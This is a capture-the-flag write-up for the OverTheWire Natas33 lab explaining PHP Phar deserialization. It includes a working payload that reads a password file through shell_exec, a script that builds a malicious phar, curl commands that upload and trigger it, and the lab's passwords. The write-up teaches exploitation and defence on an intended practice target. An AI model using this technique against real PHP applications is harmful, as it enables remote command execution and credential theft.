---
category: natas
title: Natas33 - PHP Phar Deserialization Vulnerabilities
---

website: http://natas33.natas.labs.overthewire.org/ (password: shoogeiGa2yee3de6Aex8uaXeech5eey)


Another very challenging problem. Going through the source code, I think it's related with "Insecure Deserialization", which is similar to Natas26's challenge. However, at first I don't know how and where to trigger the deserialization. After going through <a href="https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2019/06/26/exploiting_php_phar-PRD7.html">this blog</a>, I realized that the function `md5_file` can take a Phar (PHP Archive) stream as its parameter if a file name starts with <small>phar://</small>. A Phar file contains metadata in serialized format. If a file operation (such as what `md5_file()` does) is performed on an existing Phar file via the <small>phar://</small> stream wrapper, then its serialized metadata will be deserialized. If we can inject a PHP object into the the metadata, that object will be deserialized and its destruct function will be invoked when its life cycle ends. Moreover, if we look at the source code, the destruct is implemented below:

{% highlight php linenos %}
function __destruct(){
    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
    if(getcwd() === "/") chdir("/natas33/uploads/");
    if(md5_file($this->filename) == $this->signature){
        echo "Congratulations! Running firmware update: $this->filename <br>";
        passthru("php " . $this->filename);
    } else{
        echo "Failur! MD5sum mismatch!<br>";
    }
}
{% endhighlight %}

From the above source code, we can think of a few things:

1.    If the object's filename ends with ".php" (e.g., pwn.php), then line 6 will execute that PHP file if it exists (e.g., /natas33/uploads/pwn.php)
2.    To bypass line 4, if the object's signature is the same with the md5 of that PHP file, then that line will return true and we will be able to execute the PHP file we want

Another observation is that after a file is uploaded, the file name stored on the server comes from the client side:
`<input type="hidden" name="filename" value="<? echo session_id(); ?>" />`. That means we can manipulate the filename as what we want.

With above observations, here is what I did:

1. Create a PHP file (pwn.php) with just one line: `<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>`

2. Write a PHP script (create-phar.php) that creates a Phar file and saves an `Executor` object as its metadata:

    ```php
    <?php
        class Executor {
            private $filename = "pwn.php";
            private $signature = True;
            private $init = False;
        }
     
        $phar = new Phar("test.phar");
        $phar->startBuffering();
        $phar->addFromString("test.txt", 'test');
        $phar->setStub("<?php __HALT_COMPILER(); ?>");
        $o = new Executor();
        $phar->setMetadata($o);
        $phar->stopBuffering();
    ?>
    ```

    Here I assign `True` to `$signature` because it will bypass the line `md5_file($this->filename) == $this->signature` as long as `md5_file()` doesn't return an empty string. Or, you can calculate the md5 of pwn.php and assign the result to `$signature`. It will also work.

    Running create-phar.php will give us the generated Phar file test.phar:

    ```shell
    $ php create-phar.php
    $ cat test.phar
    <?php __HALT_COMPILER(); ?>
    �tO:8:"Executor":3:{s:18:"Executorfilename";s:7:"pwn.php";s:19:"Executorsignature";b:1;s:14:"Executorinit";b:0;test.txt�\Qa
           ~ؤtest8�3��V;�����t+l4'�GBMB
    ```

3. Upload both pwn.php and test.phar so that they will be stored under <small>/natas33/uploads/</small> on the server. When uploading the two files, make sure we craft their filenames so that they won't be renamed as session ids on the server.

    ```shell
    $ curl -u natas33:shoogeiGa2yee3de6Aex8uaXeech5eey "http://natas33.natas.labs.overthewire.org" \
           -F "uploadedfile=@pwn.php;type=text/php" \
           -F "filename=pwn.php"
    ... ...
        The update has been uploaded to: /natas33/upload/pwn.php<br>Firmware upgrad initialised.<br>/natas33/uploadFailur! MD5sum mismatch!<br>            
        <form enctype="multipart/form-data" action="index.php" method="POST">
     
    $ curl -u natas33:shoogeiGa2yee3de6Aex8uaXeech5eey "http://natas33.natas.labs.overthewire.org" \
           -F "uploadedfile=@test.phar;type=application/octet-stream" \
           -F "filename=test.phar"
    ... ...
        The update has been uploaded to: /natas33/upload/test.phar<br>Firmware upgrad initialised.<br>/natas33/uploadFailur! MD5sum mismatch!<br>            
        <form enctype="multipart/form-data" action="index.php" method="POST">
    ```

4. Sending another request. This time let the filename be <small>phar://test.phar</small>. This way the `md5_file()` will take a Phar stream as a parameter and help us do the trick:

    ```bash
    $ curl -u natas33:shoogeiGa2yee3de6Aex8uaXeech5eey "http://natas33.natas.labs.overthewire.org" \
           -F "uploadedfile=@test.phar;type=application/octet-stream" \
           -F "filename=phar://test.phar"
    ...
    <b>Warning</b>:  md5_file(phar://test.phar): failed to open stream: phar error: file "" in phar "test.phar" cannot be empty in 
    <b>/var/www/natas/natas33/index.php</b> on line <b>43</b><br />
    Failur! MD5sum mismatch!<br>
    ...
    /natas33/uploadCongratulations! Running firmware update: pwn.php <br>shu5ouSu6eicielahhae0mohd4ui5uig
    ```

    From the above output, you can see that `md5_file()` was actually invoked twice:

    - The first invoke was done by the `Executor` object created by the source code line `if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) { new Executor(); }`. It failed because the Phar stream didn't not provide any valid file in the URI.
    - The second invoke was done by the `Executor` object `$o = new Executor();` created by us in the test.phar: When the `md5_file()` was invoked for the first time, it read the <small>phar://test.phar</small> stream and deserialized the metadata. Because we have created an object into the metadata (see the script create-phar.php), the object, whose filename is "pwn.php" and signature is "True", was restored. When this object's life went to an end, the `md5_file()` was called during the destruction. Because `$this->signature` was true and `md5_file("pwn.php")` was a non-empty string, the line `md5_file($this->filename) == $this->signature` was bypassed and the line `passthru("php " . $this->filename);` got executed. This is equivalent to execute `passthru("php pwn.php");`. Looking at the script pwn.php, it displays the content of <small>/etc/natas_webpass/natas34</small>.

All the files are attached below:

1. The file "pwn.php":
```php
<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
```

2. The file "create-phar.php":
```php
<?php
	class Executor {
		private $filename = "pwn.php";
		private $signature = True;
		private $init = false;
	}

	$phar = new Phar("test.phar");
	$phar->startBuffering();
	$phar->addFromString("test.txt", 'test');
	$phar->setStub("<?php __HALT_COMPILER(); ?>");
	$o = new Executor();
	$phar->setMetadata($o);
	$phar->stopBuffering();
?>
```
This file is used to create our phar file "test.phar".

<strong>LESSONS LEARNED</strong>

In this challenge, we learned what a Phar file is. For some PHP functions that operate on a file, they can take Phar stream wrapper as a parameter. If you are using those functions, make sure you sanitize users' input to avoid attacks like this one.


<strong>Reference</strong>
1. <a href="https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2019/06/26/exploiting_php_phar-PRD7.html">Exploiting PHP Phar Deserialization Vulnerabilities</a>
2. <a href="https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">File Operation Induced Unserialization via the "phar://" Stream Wrapper</a>
